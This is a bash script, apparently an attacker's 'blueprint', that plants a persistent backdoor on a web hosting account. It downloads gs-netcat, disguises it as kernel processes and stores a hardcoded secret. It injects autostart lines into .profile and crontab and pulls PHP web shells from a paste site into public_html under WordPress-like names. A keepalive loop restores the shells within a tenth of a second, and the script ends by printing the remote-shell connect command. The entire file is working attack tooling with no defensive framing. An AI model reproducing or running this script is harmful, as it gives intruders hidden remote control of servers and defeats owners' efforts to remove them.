#!/bin/bash
# BLUEPRINT V2 - FIXED

echo "[*] Step 0: Cleanup..."
pkill -9 lsphp 2>/dev/null
pkill -9 vathan 2>/dev/null
pkill -9 -f keepalive 2>/dev/null
sleep 2

echo "[*] Step 1: Download gs-netcat..."
cd /tmp
U1="https://github.com/hackerschoice/gsocket"
U2="/releases/download/v1.4.43/gs-netcat_linux-x86_64"
curl -fsSL -o gs-netcat "${U1}${U2}"
if [ ! -f gs-netcat ]; then
    echo "[!] Download failed, trying wget..."
    wget -q -O gs-netcat "${U1}${U2}"
fi
if [ -f gs-netcat ]; then
    chmod +x gs-netcat
    echo "[+] gs-netcat downloaded"
else
    echo "[!] Download failed"
    exit 1
fi

echo "[*] Step 2: Create directories..."
mkdir -p /home/ckndonggalatompe/.config/system
mkdir -p /home/ckndonggalatompe/.config/htop

echo "[*] Step 3: Install binaries..."
if [ -f /tmp/gs-netcat ]; then
    cp /tmp/gs-netcat /home/ckndonggalatompe/.config/system/lsphp
    cp /tmp/gs-netcat /home/ckndonggalatompe/.config/htop/vathan
    chmod +x /home/ckndonggalatompe/.config/system/lsphp
    chmod +x /home/ckndonggalatompe/.config/htop/vathan
    echo "[+] Binaries installed"
else
    echo "[!] gs-netcat not found in /tmp"
    exit 1
fi

echo "[*] Step 4: Create key files..."
K="th8Abd2ULygw7PgrlkYiuA/qmJwG51L5"
echo "$K" > /home/ckndonggalatompe/.config/system/lsphp.dat
echo "$K" > /home/ckndonggalatompe/.config/htop/vathan.dat

echo "[*] Step 5: Create keepalive.sh..."
cat > /home/ckndonggalatompe/keepalive.sh << 'KEEPALIVE'
#!/bin/bash
T1="/home/ckndonggalatompe/public_html/wp-user.php"
S1="https://www.pastebin.cz/raw/pxxEihU"
T2="/home/ckndonggalatompe/public_html/wp-links.php"
S2="https://www.pastebin.cz/raw/pxxEihU"
echo "Monitoring files..."
H1=""
H2=""
while true; do
    if [ -f "$T1" ]; then
        C1=$(md5sum "$T1" | awk '{print $1}')
    else
        C1=""
    fi
    if [ "$C1" != "$H1" ]; then
        curl -s "$S1" -o "$T1"
        chmod 644 "$T1"
        H1=$(md5sum "$T1" | awk '{print $1}')
    fi
    if [ -f "$T2" ]; then
        C2=$(md5sum "$T2" | awk '{print $1}')
    else
        C2=""
    fi
    if [ "$C2" != "$H2" ]; then
        curl -s "$S2" -o "$T2"
        chmod 644 "$T2"
        H2=$(md5sum "$T2" | awk '{print $1}')
    fi
    sleep 0.1
done
KEEPALIVE
chmod +x /home/ckndonggalatompe/keepalive.sh

echo "[*] Step 6: Inject .profile..."
cat >> /home/ckndonggalatompe/.profile << 'PROFILE'
# vathan-kernel
V="/home/ckndonggalatompe/.config/htop/vathan"
VK="/home/ckndonggalatompe/.config/htop/vathan.dat"
/bin/pkill -0 -U1122 vathan 2>/dev/null || (GS_ARGS="-k $VK -liqD" exec -a '[ksmd]' "$V" 2>/dev/null)
# lsphp-kernel
L="/home/ckndonggalatompe/.config/system/lsphp"
LK="/home/ckndonggalatompe/.config/system/lsphp.dat"
/bin/pkill -0 -U1122 lsphp 2>/dev/null || (GS_ARGS="-k $LK -liqD" exec -a '[slub_flushwq]' "$L" 2>/dev/null)
PROFILE

echo "[*] Step 7: Create helper scripts..."
# Helper script untuk restore lsphp
cat > /home/ckndonggalatompe/.config/system/chk.sh << 'CHK1'
#!/bin/bash
H="/home/ckndonggalatompe"
L="$H/.config/system/lsphp"
LK="$H/.config/system/lsphp.dat"
K="th8Abd2ULygw7PgrlkYiuA/qmJwG51L5"
U1="https://github.com/hackerschoice/gsocket"
U2="/releases/download/v1.4.43/gs-netcat_linux-x86_64"
[ -f "$LK" ] || echo "$K" > "$LK"
[ -f "$L" ] || { curl -fsSL -o "$L" "$U1$U2"; chmod +x "$L"; }
if ! /bin/pgrep -U1122 -x lsphp > /dev/null 2>&1; then
    GS_ARGS="-k $LK -liqD" nohup "$L" >/dev/null 2>&1 &
fi
CHK1
chmod +x /home/ckndonggalatompe/.config/system/chk.sh

# Helper script untuk restore vathan
cat > /home/ckndonggalatompe/.config/htop/chk.sh << 'CHK2'
#!/bin/bash
H="/home/ckndonggalatompe"
V="$H/.config/htop/vathan"
VK="$H/.config/htop/vathan.dat"
K="th8Abd2ULygw7PgrlkYiuA/qmJwG51L5"
U1="https://github.com/hackerschoice/gsocket"
U2="/releases/download/v1.4.43/gs-netcat_linux-x86_64"
[ -f "$VK" ] || echo "$K" > "$VK"
[ -f "$V" ] || { curl -fsSL -o "$V" "$U1$U2"; chmod +x "$V"; }
if ! /bin/pgrep -U1122 -x vathan > /dev/null 2>&1; then
    GS_ARGS="-k $VK -liqD" nohup "$V" >/dev/null 2>&1 &
fi
CHK2
chmod +x /home/ckndonggalatompe/.config/htop/chk.sh

# Helper script untuk restore keepalive
cat > /home/ckndonggalatompe/.config/system/chk_ka.sh << 'CHK3'
#!/bin/bash
H="/home/ckndonggalatompe"
KS="$H/keepalive.sh"
KO="$H/keepalive.out"
WS="https://www.pastebin.cz/raw/pxxEihU"
if [ ! -f "$KS" ]; then
cat > "$KS" << 'KA'
#!/bin/bash
T1="/home/ckndonggalatompe/public_html/wp-user.php"
S1="https://www.pastebin.cz/raw/pxxEihU"
T2="/home/ckndonggalatompe/public_html/wp-links.php"
S2="https://www.pastebin.cz/raw/pxxEihU"
H1=""
H2=""
while true; do
[ -f "$T1" ] && C1=$(md5sum "$T1"|awk '{print $1}') || C1=""
[ "$C1" != "$H1" ] && { curl -s "$S1" -o "$T1"; chmod 644 "$T1"; H1=$(md5sum "$T1"|awk '{print $1}'); }
[ -f "$T2" ] && C2=$(md5sum "$T2"|awk '{print $1}') || C2=""
[ "$C2" != "$H2" ] && { curl -s "$S2" -o "$T2"; chmod 644 "$T2"; H2=$(md5sum "$T2"|awk '{print $1}'); }
sleep 0.1
done
KA
chmod +x "$KS"
fi
pgrep -f "bash.*keepalive" || nohup bash "$KS" > "$KO" 2>&1 &
CHK3
chmod +x /home/ckndonggalatompe/.config/system/chk_ka.sh

echo "[*] Step 8: Inject crontab..."
T="/tmp/c1122.tmp"
crontab -l 2>/dev/null > "$T" || touch "$T"
sed -i '/lsphp/d' "$T"
sed -i '/vathan/d' "$T"
sed -i '/keepalive/d' "$T"
sed -i '/chk/d' "$T"
C1="/home/ckndonggalatompe/.config/system/chk.sh"
C2="/home/ckndonggalatompe/.config/htop/chk.sh"
C3="/home/ckndonggalatompe/.config/system/chk_ka.sh"
KS="/home/ckndonggalatompe/keepalive.sh"
KO="/home/ckndonggalatompe/keepalive.out"
echo "* * * * * /bin/bash $C1 2>/dev/null" >> "$T"
echo "* * * * * /bin/bash $C2 2>/dev/null" >> "$T"
echo "* * * * * /bin/bash $C3 2>/dev/null" >> "$T"
echo "@reboot /bin/bash $KS > $KO 2>&1" >> "$T"
crontab "$T"
rm -f "$T"

echo "[*] Step 9: Deploy webshells..."
WS="https://www.pastebin.cz/raw/pxxEihU"
W1="/home/ckndonggalatompe/public_html/wp-user.php"
W2="/home/ckndonggalatompe/public_html/wp-links.php"
curl -s "$WS" -o "$W1"
curl -s "$WS" -o "$W2"
chmod 644 "$W1" "$W2"

echo "[*] Step 10: Start backdoors..."
L="/home/ckndonggalatompe/.config/system/lsphp"
LK="/home/ckndonggalatompe/.config/system/lsphp.dat"
V="/home/ckndonggalatompe/.config/htop/vathan"
VK="/home/ckndonggalatompe/.config/htop/vathan.dat"
sleep 1
if [ -f "$L" ]; then
    if ! /bin/pgrep -U1122 -x lsphp > /dev/null 2>&1; then
        GS_ARGS="-k $LK -liqD" nohup "$L" >/dev/null 2>&1 &
        echo "[+] lsphp started"
    else
        echo "[!] lsphp already running"
    fi
else
    echo "[!] lsphp binary not found"
fi
if [ -f "$V" ]; then
    if ! /bin/pgrep -U1122 -x vathan > /dev/null 2>&1; then
        GS_ARGS="-k $VK -liqD" nohup "$V" >/dev/null 2>&1 &
        echo "[+] vathan started"
    else
        echo "[!] vathan already running"
    fi
else
    echo "[!] vathan binary not found"
fi

echo "[*] Step 11: Start keepalive..."
KS="/home/ckndonggalatompe/keepalive.sh"
KO="/home/ckndonggalatompe/keepalive.out"
if ! pgrep -f "bash.*keepalive.sh" > /dev/null 2>&1; then
    nohup bash "$KS" > "$KO" 2>&1 &
    echo "[+] keepalive started"
else
    echo "[!] keepalive already running"
fi

sleep 2
echo ""
echo "=========================================="
echo "         INSTALLATION COMPLETE"
echo "=========================================="
echo "Secret: th8Abd2ULygw7PgrlkYiuA/qmJwG51L5"
echo "Connect: gs-netcat -s 'th8Abd2ULygw7PgrlkYiuA/qmJwG51L5' -i"
echo "=========================================="
ps aux | grep -E "lsphp|vathan|keepalive" | grep -v grep
